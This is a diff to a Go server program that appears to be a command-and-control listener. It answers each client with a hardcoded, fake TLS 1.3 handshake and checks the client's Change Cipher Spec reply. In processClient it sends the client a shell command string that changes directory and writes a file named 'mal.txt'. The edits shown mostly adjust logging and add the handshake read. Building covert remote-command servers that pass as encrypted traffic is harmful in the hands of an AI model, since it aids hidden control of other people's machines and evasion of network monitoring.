@@ -21,16 +21,17 @@ func main() {
                 os.Exit(1)
         }
         defer server.Close()
-        fmt.Println("[+] Listening on port " + SERVER_PORT)
-        fmt.Println("[+] Waiting for a client ...")
+        fmt.Printf("[+] Listening on %s\n", server.Addr().String())
+        client_num := 1;
         for {
                 connection, err := server.Accept()
                 if err != nil {
                         fmt.Println("[-] Error accepting: ", err.Error())
                         os.Exit(1)
                 }
-                fmt.Println("[+] Connected to a client")
-                go serverHello(connection)
+                fmt.Printf("[+] Connected to CLIENT_%d (%s)\n", client_num, connection.RemoteAddr())
+                client_num++
+                serverHello(connection)
         }
 }
 
@@ -50,7 +51,7 @@ func serverHello(connection net.Conn) {
         fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen])))
 
         fmt.Println("[+] Sending 'Server Hello', 'Server Change Cipher Spec', 'Server Encrypted Extensions',\n",
-                    "            'Server Certificate', 'Server Certificate Verify', 'Server Handshake Finished'")
+                     "           'Server Certificate', 'Server Certificate Verify', 'Server Handshake Finished'")
         _, err = connection.Write([]byte{0x16, 0x03, 0x03, 0x00, 0x7a, 0x02, 0x00, 0x00, 0x76, 0x03, 0x03, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 
 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x20, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 
 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 
@@ -116,6 +117,19 @@ func serverHello(connection net.Conn) {
 0x70, 0x06, 0x00, 0x2d, 0x0e, 0x84, 0xfe, 0xd9, 0xad, 0xf2, 0x7a, 0x43, 0xb5, 0x19, 0x23, 0x03, 
 0xe4, 0xdf, 0x5c, 0x28, 0x5d, 0x58, 0xe3, 0xc7, 0x62, 0x24, 0x07, 0x84, 0x40, 0xc0, 0x74, 0x23, 
 0x74, 0x74, 0x4a, 0xec, 0xf2, 0x8c, 0xf3, 0x18, 0x2f, 0xd0})
+
+        mLen2, err2 := connection.Read(buffer)
+        if err2 != nil {
+                fmt.Println("Error reading:", err2.Error())
+        }
+
+        if bytes.Compare(buffer[0:3], []byte{0x14, 0x03, 0x03}) != 0 {
+                fmt.Println("[-] Invalid 'Client Change Cipher Spec'")
+                return
+        }
+
+        fmt.Println("[+] Received 'Client Change Cipher Spec', 'Client Handshake Finished'")
+        fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen2])))
 }
 
 func processClient(connection net.Conn) {
@@ -129,9 +143,9 @@ func processClient(connection net.Conn) {
         if err != nil {
                 fmt.Println("Error reading:", err.Error())
         }
-        //fmt.Println("Received: ", string(buffer[:mLen]))
+        // fmt.Println("Received: ", string(buffer[:mLen]))
         stdoutDumper.Write([]byte(buffer[:mLen]))
         _, err = connection.Write([]byte("pwd && cd ../ && pwd && echo 'testing123' > mal.txt"))
         }
-//        connection.Close()
+        // connection.Close()
 }
